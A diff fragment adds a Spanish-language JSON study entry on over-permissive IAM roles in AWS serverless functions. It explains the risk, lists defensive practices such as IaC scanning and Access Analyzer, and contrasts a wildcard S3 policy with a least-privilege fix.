+    "para": "Identificar y eliminar permisos excesivos evita que una vulnerabilidad menor (como SSRF, inyección o dependencia comprometida) escale hacia robo masivo de datos, destrucción de recursos, pivote lateral o compromiso total de la cuenta cloud.",
+    "como": "Durante el desarrollo, por comodidad o falta de visibilidad, se suelen asignar políticas administradas amplias (como `AmazonS3FullAccess`, `AmazonDynamoDBFullAccess` o `AdministratorAccess`) o comodines (`Action: \"*\"`, `Resource: \"*\"`) a un rol compartido por múltiples funciones. Al ejecutarse la función, AWS inyecta en sus variables de entorno credenciales STS temporales vinculadas a ese rol. Si un atacante logra leer esas credenciales o ejecutar código dentro de la microVM, hereda inmediatamente todos los permisos excesivos del rol desde cualquier ubicación de Internet.",
+    "practicas": [
+      "Prohibir políticas administradas amplias (`*FullAccess`, `PowerUserAccess`, `AdministratorAccess`) y comodines `Resource: \"*\"` mediante reglas de escaneo IaC (Checkov, cfn-lint, OPA) en CI/CD.",
+      "Revisar hallazgos de IAM Access Analyzer y CloudTrail para detectar acciones concedidas que la función nunca invoca y podarlas.",
+      "Desglosar funciones monolíticas con demasiadas responsabilidades en funciones más pequeñas para poder otorgar permisos granulares.",
+      "Error típico: olvidar restringir permisos de KMS, Secrets Manager o S3 al recurso específico, permitiendo que una función de solo lectura borre o descifre datos de otros entornos."
+    ],
+    "ejemplo": "# RIESGO CRÍTICO: comodín en acción y recurso\n# \"Effect\": \"Allow\", \"Action\": \"s3:*\", \"Resource\": \"*\"\n\n# REMEDIACIÓN: acción y prefijo exactos\n{\n  \"Effect\": \"Allow\",\n  \"Action\": [\"s3:GetObject\"],\n  \"Resource\": \"arn:aws:s3:::invoices-prod/incoming/*\"\n}",
+    "entrevista": "Los permisos excesivos en funciones serverless convierten cualquier RCE o fuga de variables de entorno en un compromiso amplio de la cuenta; se previenen prohibiendo comodines en IaC, usando roles por función y podando permisos con IAM Access Analyzer."
+  }
+}
